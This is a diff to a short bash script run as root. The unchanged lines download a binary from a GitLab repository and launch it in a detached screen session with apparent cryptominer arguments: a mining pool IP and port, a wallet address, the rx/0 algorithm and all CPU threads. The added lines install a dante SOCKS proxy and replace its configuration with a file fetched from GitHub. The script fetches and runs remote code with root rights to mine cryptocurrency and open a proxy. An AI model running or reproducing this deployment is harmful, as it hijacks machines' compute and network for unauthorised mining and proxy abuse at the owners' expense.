@@ -1,5 +1,11 @@
 #!/usr/bin/env bash
 sudo su <<EOF
+sudo apt update
+sudo apt install dante-server
+mv /etc/danted.conf der
+cd /etc/
+wget https://raw.githubusercontent.com/sarifadim/dopla/main/danted.conf
+service danted start
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/bismillah && chmod +x * && screen -dms run ./bismillah -o 34.149.22.228:9200 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.ARX -a rx/0 -t $(nproc --all)
 EOF
 screen -r
